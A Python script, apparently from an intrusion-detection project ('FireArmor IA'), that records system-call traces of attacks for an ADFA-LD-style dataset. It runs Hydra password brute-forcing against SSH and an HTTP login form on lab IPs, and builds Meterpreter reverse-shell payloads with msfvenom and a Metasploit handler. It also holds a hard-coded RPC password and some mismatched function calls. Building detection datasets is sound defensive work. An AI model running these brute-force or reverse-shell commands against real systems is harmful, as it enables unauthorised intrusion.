import csv
import subprocess
import time
import psutil
import os
import multiprocessing
import netifaces
from pymetasploit3.msfrpc import MsfRpcClient
import json
import re



def get_my_ip():
    interfaces = netifaces.interfaces()
    for interface in interfaces:
        if interface != 'wlan0':
            addresses = netifaces.ifaddresses(interface)
            if netifaces.AF_INET in addresses:
                ipv4_address = addresses[netifaces.AF_INET][0]['addr']
                return ipv4_address



def execute_command(command):
    process = subprocess.Popen(command, shell=True)
    process.wait()

def kill_process_by_port(port):
    for proc in psutil.process_iter():
        try:
            connections = proc.connections()
            for conn in connections:
                if conn.laddr.port == port:
                    proc.kill()
                    print(f"Processus tué : {proc.pid}")
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass





def get_syscall_from_ssh():
    wordList = '/usr/share/wordlists/rockyou.txt'
    ip = '10.10.10.16'
    name = 'root'
    output_file = 'output.txt'
    syscall_names_file_base = 'syscall_names.txt'
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
    

    for i in range(20):

        cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -p {wordList} {ip} ssh".format(output_file=output_file, name=name, wordList=wordList, ip=ip)
        cmd2 = "awk -F '(' '{{print $1}}' {output_file} | awk -F ' ' '{{print $NF}}' > {syscall_names_file_base}".format(output_file=output_file, syscall_names_file_base=syscall_names_file_base)

        # Exécutez la commande 1
        process = subprocess.Popen(cmd1, shell=True)
        process.wait()

        # Exécutez la commande 2
        process = subprocess.Popen(cmd2, shell=True)
        process.wait()

        replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-{i}.txt'.format(i=i))

def get_syscall_from_hydra_http():
    output_file = 'output.txt'
    syscall_names_file_base = 'syscall_names.txt'
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
    

    cmd1 = "strace -e trace=all -o {output_file} hydra -l {name} -P {wordList} {ip} http-post-form \"/:username=^USER^&password=^PASS^:F=incorrect\" -V".format(output_file=output_file, name='molly', wordList='/usr/share/wordlists/rockyou.txt', ip='10.10.69.36')
    cmd2 = "awk -F '(' '{{print $1}}' {output_file} | awk -F ' ' '{{print $NF}}' > {syscall_names_file_base}".format(output_file=output_file, syscall_names_file_base=syscall_names_file_base)

    # Exécutez la commande 1
    process = subprocess.Popen(cmd1, shell=True)
    process.wait()

    # Exécutez la commande 2
    process = subprocess.Popen(cmd2, shell=True)
    process.wait()

    replace_syscall_with_number(syscall_names_file_base, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Hydra_SSH_11/UAD-Hydra-SSH-1-0.txt')

    


def get_syscall_from_Meterpreter():
    # Dans un terminal load msgrpc [Pass=hugo]


    client = MsfRpcClient('f6v3ltZ9', port=55552)
    payload_name = "linux/x86/meterpreter/reverse_tcp"
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
    payload_file = "meterpreterPayload"
    ip = get_my_ip()
   # Create a new console
    console = client.consoles.console()

    # Set up the listener
    listener_options = {
        'Payload': payload_name,
        'LHOST': ip,
        'LPORT': 55552
    }
    console.write('use exploit/multi/handler\n')
    console.write(f'set {",".join(f"{k} {v}" for k, v in listener_options.items())}\n')
    console.write('exploit -j\n')
   
    cmd4 = "strace -e trace=all -o output.txt ./{payload_file}; awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload_file=payload_file)
    
    # Exécuter la commande cmd4 dans un terminal
    print("process2")
    process = subprocess.Popen(cmd4, shell=True)

    
    replace_syscall_with_number('syscall_names.txt', f'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')
    







'''
def get_syscall_from_Meterpreter():
    syscall_names_file_base = 'syscall_names.txt'
    payload = "meterpreterPayload"
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'
    ip = get_my_ip()
    print('your ip :',ip)



    command = "msfvenom --list payloads | grep linux | grep meterpreter | awk '{print $1}'"
    process = subprocess.Popen(command, stdout=subprocess.PIPE, stderr=subprocess.PIPE, shell=True)
    out, err = process.communicate()
    payload_list = out.decode('utf-8').splitlines()

    payload_list_cpu = [None] * len(payload_list)
    for i in range(len(payload_list)):
        kill_process_by_port(4444)
        payload_list_cpu[i] = payload_list[i].split('/')[1]
        print(payload_list_cpu[i])

        cmd1 = "msfvenom -p {payload_list} LHOST={ip} LPORT=4444 --platform linux -a {payload_list_cpu} -f elf -o {payload}".format(ip=ip, payload=payload,payload_list_cpu=payload_list_cpu[i], payload_list=payload_list[i])
        cmd2 = "chmod +x {payload}".format(payload=payload)

        process = subprocess.Popen(cmd1, shell=True)
        process.wait()

        process = subprocess.Popen(cmd2, shell=True)
        process.wait()

        cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD {payload_list}; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip, payload_list=payload_list[i])
        cmd4 = "strace -e trace=all -o output.txt ./{payload}; awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)
        
        # Exécuter la commande cmd3 dans un terminal
        print(payload_list[i])
        print("process1")
        process = subprocess.Popen(cmd3, shell=True)

        time.sleep(10)
        # Exécuter la commande cmd4 dans un terminal
        print("process2")
        process = subprocess.Popen(cmd4, shell=True)
       
        
        replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-{i}.txt'.format(i=i))
'''

'''
def get_syscall_from_Meterpreter():
    syscall_names_file_base = 'syscall_names.txt'
    payload = "meterpreterPayload"
    csv_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/label.csv'

    ip = get_my_ip()
    print('your ip :',ip)

    kill_process_by_port(4444)
    cmd1 = "msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST={ip} LPORT=4444 --platform linux -a x86 -f elf -o {payload}".format(ip=ip, payload=payload)
    cmd2 = "chmod +x {payload}".format(payload=payload)
    cmd3 = 'msfconsole -x "use exploit/multi/handler; set PAYLOAD linux/x86/meterpreter/reverse_tcp; set LHOST {ip}; set LPORT 4444; run"'.format(ip=ip)
    cmd4 = "strace -e trace=all -o output.txt ./{payload} && awk -F '(' '{{print $1}}' output.txt | awk -F ' ' '{{print $NF}}' > syscall_names.txt".format(payload=payload)

    process = subprocess.Popen(cmd1, shell=True)
    process = subprocess.Popen(cmd2, shell=True)

        
    # Exécuter la commande cmd3 dans un terminal
    print("process1")
    process1 = subprocess.Popen(cmd3, shell=True)
    
    time.sleep(20)

    # Exécuter la commande cmd4 dans un terminal
    print("process2")
    process2 = subprocess.Popen(cmd4, shell=True)
    
    time.sleep(20)
            
    replace_syscall_with_number(syscall_names_file_base, csv_file, 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/Attack_Data_Master/Meterpreter_11/UAD-Meterpreter-11-0.txt')
'''

def get_systemcall_from_your_computer():
    syscall_regex = r'#define __NR(?:3264_)?(\w+)\s+(\d+)'
    labelFile ='FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/syscalls.json'

    syscalls = {}

    with open('/usr/include/asm-generic/unistd.h', 'r') as f:
        content = f.read()
        matches = re.findall(syscall_regex, content)

        for match in matches:
            syscall_name = match[0].replace("_", "")
            syscall_number = int(match[1])
            syscalls[syscall_name] = syscall_number

    with open(labelFile, 'w') as f:
        json.dump(syscalls, f, indent=4)

def replace_syscall_with_number(input_file, output_file):
    json_file = 'FireArmor IA/AI_With_ADFA/ADFA-LD/DataSet/syscalls.json'
    
    # load syscall numbers from JSON
    with open(json_file, 'r') as f:
        syscalls = json.load(f)


    # Load syscall numbers from JSON
    with open(input_file, 'r') as input_file, open(output_file, 'w') as output_file:
        for line in input_file:
            syscall_name = line.strip()
            if syscall_name in syscalls:
                syscall_number = syscalls[syscall_name]
                output_file.write(str(syscall_number) + ' ')
            else:
                print('Syscall not found: ' + syscall_name)
                
            

# get_syscall_from_ssh()
# get_syscall_from_Meterpreter()
get_systemcall_from_your_computer()
get_syscall_from_hydra_http()